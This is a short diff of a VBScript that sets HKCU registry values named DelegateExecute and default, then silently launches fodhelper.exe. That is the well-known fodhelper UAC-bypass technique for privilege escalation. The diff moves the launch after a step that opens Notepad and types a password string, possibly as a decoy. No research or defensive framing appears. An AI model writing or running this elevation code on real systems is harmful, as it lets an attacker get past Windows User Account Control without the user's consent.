@@ -15,12 +15,12 @@ Registry.CreateKey HKEY_CURRENT_USER, RegKeyPath
 Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DelegateExecRegKeyName, DelegateExecRegKeyValue
 Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DefaultRegKeyName, DefaultRegKeyValue
 
-Set Shell = WScript.CreateObject("WScript.Shell")
-Shell.Run FodHelperPath, 0, True
-
 Set Notepad = WScript.CreateObject("WScript.Shell")
 Notepad.Run "c:\\windows\\system32\\notepad.exe"
 
 WScript.Sleep 1000
 
 Notepad.SendKeys "Password: secure this"
+
+Set Shell = WScript.CreateObject("WScript.Shell")
+Shell.Run FodHelperPath, 0, True
